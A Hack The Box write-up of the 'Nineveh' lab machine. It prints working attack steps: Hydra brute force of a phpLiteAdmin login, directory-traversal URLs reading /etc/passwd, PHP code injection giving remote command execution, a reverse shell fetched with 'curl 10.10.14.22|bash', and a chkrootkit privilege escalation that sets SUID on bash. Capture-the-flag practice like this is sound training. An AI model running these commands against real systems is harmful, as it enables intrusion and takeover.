---
layout: post
title:  "Nineveh Writeup - Hack The Box"
date:   2025-05-15
desc: ""
keywords: "HTB,eWPT,OSWE,OSCP,Linux,Hydra,LFI,Steganography,phpLiteAdmin,Port Knocking,Chkrootkit,Wrappers,Medium"
categories: [HTB]
tags: [HTB,eWPT,OSWE,OSCP,Linux,Hydra,LFI,Steganography,phpLiteAdmin,Port Knocking,Chkrootkit,Wrappers,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

What can I say about the **Nineveh** machine, to me it was excellent, for the diversity of techniques, vulnerabilities, technologies that I did not know and the new knowledge that I could incorporate and assimilate in each step I took to engage the lab. With **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** I am sure that with each challenge I face I can advance on my way to becoming a competent pentester. The box is rated **Medium**, but with so many actions I had to perform and the lateral thinking to find the attack vector, I would rate it higher, so now I spaw the lab to engage it.

<br /><br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `ping` I send a trace to the target machine and the output of the command informs me that the packet was sent and another received, so the connection is correct, also with the script `whichSystem.py` developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community I can have a great certainty that the **OS** installed on the target is **Linux**. With `nmap` I get the most relevant information about those services exposed on the open ports, also about their corresponding versions and the domain implemented in the **HTTPS** service on port **443**. With all this data I can search in **Launchpad** for the codename of the box (**Xenial**). I add the domain to my **hosts** file so that there is no problem in the resolution, with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** leak information of the web service technologies. On both web pages, both the one over **HTTP** and **HTTPS** there is not much content available.

```bash
ping -c 1 10.10.10.43
whichSystem.py 10.10.10.43
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.43 -oG allPorts
nmap -sCV -p80,443 10.10.10.43 -oN targeted
cat targeted
#    --> Apache httpd 2.4.18
#    google.es --> Apache httpd 2.4.18 launchpad     Xenial
#    --> nineveh.htb

nvim /etc/hosts
cat /etc/hosts | tail -n 2
ping -c 1 nineveh.htb
whatweb http://10.10.10.43 https://10.10.10.43
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `openssl` I can try to get more information from the **SSL** certificate of the **HTTPS** service on port **443**, but except for an email and the domain I already have, I can't find anything interesting. I download the background image of the web page to analyze it with `steghide`, but the format is not supported. If I use one of the `nmap` scripts to enumerate directories and files, I find the **info.php** file, which allows me to know the **PHP** version and also that the **PHP** functions **[in charge of command execution](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720){:target="_blank"}** are not disabled, good news if I get an **RCE**.

```bash
openssl s_client --connect 10.10.10.43:443
mv /home/al3j0/Downloads/Untitled.png .
file Untitled.png
steghide info Untitled.png

nmap --script http-enum -p80,443 10.10.10.43 -oN webScan
# /info.php: Possible information file
# /db/: BlogWorx Database

# http://nineveh.htb/info.php
# PHP Version 7.0.18
# disable_functions

# PHP dangerous functions
# exec,passthru,system,shell_exec,``,popen,proc_open,pcntl_exec
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The other path I found with `nmap`, turns out to be the **[phpLiteAdmin](https://www.phpliteadmin.org/){:target="_blank"}** authentication panel, where I can see the version of **phpLiteAdmin** and the leakage of information due to a coding error. With `searchploit` I find two exploits for this technology, when analyzing the script that performs a **Remote PHP Code Injection**, it uses the default password, but in this machine it is not the one set. With `wfuzz` I find another hidden directory that turns out to be another web service implemented in **PHP** (information I get with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**).

> **[phpLiteAdmin](https://www.phpliteadmin.org/){:target="_blank"}** is a web-based **SQLite** database admin tool written in **PHP** with support for **SQLite3** and **SQLite2**. Following in the spirit of the flat-file system used by SQLite, phpLiteAdmin consists of a single source file, phpliteadmin.php, that is dropped into a directory on a server and then visited in a browser.

```bash
# https://nineveh.htb/db/

searchsploit phplite 1.9
searchsploit -x php/webapps/24044.txt
# Default Password admin :(

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://nineveh.htb/FUZZ
# department
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

In the new service I found, which is an authentication panel, I try basic attacks like using default credentials or basic **[SQL injections](https://portswigger.net/web-security/sql-injection){:target="_blank"}**, but they don't work at the moment. In the **Source code** I find a strange message, maybe it is a vulnerability present in **MySQL**. What I'm going to do is not recommended in real audits, but I can't find another way for the moment, with `hydra` I'm going to do a brute-force attack on the first authentication panel following the instructions I found in a **Github** repository, **[Brute-Force-Using-Hydra-On-Login-Page](https://github.com/jayeshjawade/Brute-Force-Using-Hydra-On-Login-Page-){:target="_blank"}**, and I succeed to find the password.

```bash
# http://nineveh.htb/department/login.php
# Ctrl^u ---> <!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->

# https://nineveh.htb/db/index.php

hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password."
# https://nineveh.htb/db/index.php
# :)
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to obtain the password with a brute force attack is to use BurpSuite's **Intruder** tool with **Sniper attack**. I only have to capture the request sent to the server when I try to authenticate and perform the attack on the correct field (**password**) using a custom dictionary, I can also create a **regex** with the error message that is obtained if the password is incorrect, so I can see the valid credential faster.

```bash
head -n 1500 /usr/share/wordlists/rockyou.txt > passwords.txt
burpsuite &>/dev/null & disown
# Burp -> intruder -> Payloads -> Options (Grep-Extract: Invalid Password!)
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can access the **phpLiteAdmin dashboard** I have all the software information. Perhaps I can exploit the **Remote PHP Code Injection** vulnerability by following the instructions in the script I found with `searchsploit`. I just need to create a new database with **.php** extension and then access it to execute the malicious content that I enter in a row of a table, but there is the problem that **I can not access the path** where it is stored, I must find a way to do it.

```bash
searchsploit -x php/webapps/24044.txt

# https://nineveh.htb/db/index.php?view=structure
# Path to database: /var/tmp/oldboy.php         :(
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something that catches my attention is the message that I had found hardcoded in the other web page, so I try some techniques to bypass the panel, like **SQLi**, that don't work. But if with **BurpSuite** I capture the request before it is sent to the server and try a **[Type Juggling attack](https://www.invicti.com/blog/web-security/type-juggling-authentication-bypass-cms-made-simple/){:target="_blank"}** I succeed in my goal and get access as admin to the website.

> **[How Type Juggling Happens](https://mahafuz.medium.com/understanding-type-juggling-in-php-48347f929aa0){:target="_blank"}**: Type juggling occurs when **PHP** encounters operations or comparisons involving variables of different data types. **PHP** will automatically attempt to convert one or both of the variables to a common data type before performing the operation or comparison.

```bash
# http://nineveh.htb/department/login.php
# admin' or 1=1-- -

burpsuite &>/dev/null & disown
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I start interacting with the web service, I notice that in order to access the available resources, their location must be sent through a parameter to the server. If I try to perform a **Directory Traversal**, after adjusting the **URL** I can access the **passwd** system file (there is also a message on the page that could be interpreted as a clue). I can't yet see the contents of the first flag but I can enumerate the system and know all the open ports.

```bash
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt

# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt../../../../../../etc/passwd
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../etc/passwd
# :)

# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../home/amrois/user.txt
# File name too long.     :(
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../home/amrois/.ssh/authorized_keys
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../proc/net/fib_trie
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../proc/net/tcp

cat Data.txt | grep -v local | awk '{print $2}' FS=' ' | awk '{print $2}' FS=':' | sort -u | while read port; do echo -e "\n[!] Port $port --> $((0x$port))"; done
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can access the resources on the victim machine, I will return to the other web service to succeed in compromising the system. I follow the steps of the exploit, in the database that I had already saved (with **.php** extension) I only have to create a table and then a field, in which I will inject a command in **PHP** format and **TEXT** type. After saving all the changes, I can access the database by exploiting the **Directory Path Traversal** vulnerability and thus execute commands remotely. I enumerate the system a bit and check the connectivity to my attacking machine with a trace sent with `ping` from the victim machine.

```bash
# https://nineveh.htb/db/index.php?switchdb=%2Fvar%2Ftmp%2Foldboy.php

# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/oldboy.php
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/oldboy.php&cmd=whoami
# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/oldboy.php&cmd=hostname

tcpdump -i tun0 icmp -n

# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/oldboy.php&cmd=ping%20-c%201%2010.10.14.22
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

One of the methods to access the system once I have a **RCE**, is to create an **index.html** file with a **Bash** command that sends a **Reverse Shell**, then configure a local server with `python` on my attacking machine so that the malicious file is accessible, the following is to open a local port with `nc` to establish the remote connection and finally from the browser, with `curl` send a request to the **IP** of my machine and interpret the content with `bash`. I follow all the steps and I can successfully engage the box to perform the basic enumeration commands (I confirm that the **Codename** is **xenial**), but before continuing I will perform a console treatment to work more efficiently with the terminal.

```bash
nvim index.html
cat index.html
python3 -m http.server 80
nc -nlvp 443

# http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/oldboy.php&cmd=curl%2010.10.14.22|bash

whoami
hostname
hostname -I
uname -a
lsb_release -a

script /dev/null -c bash
# [Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After enumerating the system I find a folder with a somewhat suggestive name, there is a file whose extension is an image. If I analyze the image with `string`, most of the content is unreadable but it has also the content of a hidden key, possibly to connect by **SSH**. If I create the key and give it the corresponding permissions (**600**) I can access port **22** (which is open locally), it does not allow me to access with the **root** user account but I can with the **amrois** one.

```bash
cd /var/www/
ls -la

cd /var/www/ssl/secure_notes
strings nineveh.png

cd /dev/shm
nano id_rsa
cat id_rsa | head -n 4
chmod 600 id_rsa
ssh -i id_rsa root@localhost
# :(
ssh -i id_rsa amrois@localhost
# :)
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I perform a **User pivoting**, I can now access the contents of the first flag and look for an attack vector to escalate privileges. I find that the **Polkit’s** `pkexec` tool has **SUID** permissions and is most likely vulnerable to **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}**, but I will look for the intended path for this machine. There is another binary, `at`, that I found suspicious but when looking for a command in **[GTFObins](https://gtfobins.github.io/gtfobins/at/#shell){:target="_blank"}** to get a **Shell**, I am unable to escalate privileges. I also find with `ps` the **knockd** daemon enabled, which indicates that **[Port Knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/){:target="_blank"}** is being used on this machine. In the **knockd.conf** file I find the sequence of ports that I must touch to enable the **SSH** service remotely, so I **[install `knock`](https://fzuckerman.wordpress.com/2016/10/08/golpeos-de-puertos-en-kali-linux-port-knocking/){:target="_blank"}** on my attacker machine to enable the **SSH** port of the victim machine and access it, this way I succeed in persistence.

> **[knockd](https://linux.die.net/man/1/knockd){:target="_blank"}** is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special **"knock"** sequences of port-hits. A client makes these port-hits by sending a **TCP** (or **UDP**) packet to a port on the server.

> **Victime Machine**:

```bash
find \-perm -4000 2>/dev/null
ls -l ./usr/bin/at

echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
whoami

sudo -l
netstat -nat
ps -faux
# /usr/sbin/knockd -d -i ens160

cat /etc/knockd.conf
# sequence = 571, 290, 911
```

> **Attacker Machine**:

```bash
nmap -sT -v -p22 -n 10.10.10.43
# 22/tcp filtered ssh

locate knock
sudo apt-get install knockd
knock --help
knock 10.10.10.43 571:tcp 290:tcp 911:tcp -d 500
nmap -sT -v -p22 -n 10.10.10.43
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have access to port **22** of the **SSH** service, I am going to create the **id_rsa** key to be able to access it. After enumerating the system and not finding too much information, I create a small script to monitor the processes running in the background and I already find a process in charge of finding possible **rootkits** that I must investigate. I can also use **[Dominic Breuker's `pspy`](https://github.com/DominicBreuker/pspy){:target="_blank"}** script to analyze the processes, after downloading it, compiling the code with `go`, compressing the binary with `upx` and transferring it to the target machine I have problem with the version when I run it. But if I use a deprecated version if I succeed to find the **`chkrootkit`** process again.

> **Attacker Machine**:

```bash
nvim id_rsa
cat id_rsa | head -n 5
chmod 600 id_rsa
ssh -i id_rsa amrois@10.10.10.43
```

> **Victime Machine**:

```bash
export TERM=xterm

touch procmon.sh
nano procmon.sh
cat procmon.sh
chmod +x procmon.sh
./procmon.sh
# > root     /bin/sh -c /root/vulnScan.sh
# > root     /bin/sh /usr/bin/chkrootkit
```

> **Attacker Machine**:

```bash
git clone https://github.com/DominicBreuker/pspy
go build -ldflags '-s -w' .
du -hc pspy
# 3.4M	total
upx pspy
du -hc pspy
# 1.4M	total
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.22/pspy
chmod +x pspy
./pspy
# :( Version Problem
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/pspy64 ./pspy
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.22/pspy
chmod +x pspy
./pspy
# :)
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To escalate privileges, I just had to search for an exploit for `chkrootkit` with `searchsploit` and I found one that gives me the necessary steps to finish engaging the box. I don't know the version of the binary, but since it is a well-known vulnerability I will follow the steps and try to escalate privileges. I create a malicious **update** file in the path **/tmp** whose content is a system command that enables the **SUID** bit to the `bash` Shell, after waiting a while the bit is modified and I can get a shell impersonating the **root** user, finally I succeed in engaging the box.

> **Attacker Machine**:

```bash
searchsploit chkrootkit
searchsploit -x linux/local/33899.txt
```

> **Victime Machine**:

```bash
cd /tmp
nano update
cat update
```

> **update**:

```bash
#!/bin/bash

chmod u+s /bin/bash
```

> **Victime Machine**:

```bash
ls -l /bin/bash

chmod +x update
watch -n 1 ls -l /bin/bash
# :)

bash -p
# :)
```

<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> I really had to invest a lot of time in this machine, plus all my concentration on every step I made and every time I got stuck. I had to seek help from the community to understand how to engage the box, as I had to link various types of vulnerability exploits. It was a nice experience and I felt very satisfied with the knowledge gained, so since I am motivated I will go for the next lab work but I must not forget to kill the box **Nineveh** in the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** plataform.

<br /><br />
<img src="{{ site.img_path }}/nineveh_writeup/Nineveh_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
